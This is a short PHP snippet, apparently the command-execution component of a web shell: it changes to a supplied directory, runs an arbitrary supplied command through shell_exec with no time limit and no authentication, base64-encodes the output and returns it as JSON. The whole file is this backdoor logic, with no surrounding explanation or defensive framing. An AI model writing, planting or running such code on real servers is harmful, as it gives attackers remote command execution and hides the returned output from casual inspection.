<?php
set_time_limit(0);
$re = array('code'=>1, 'result'=>'');
chdir($pwd);
if(function_exists('shell_exec')){
    $re['result'] = shell_exec($cmd);
    $re['result'] = base64_encode($re['result']);
}else{
    $re['code'] = 0;
}
echo json_encode($re);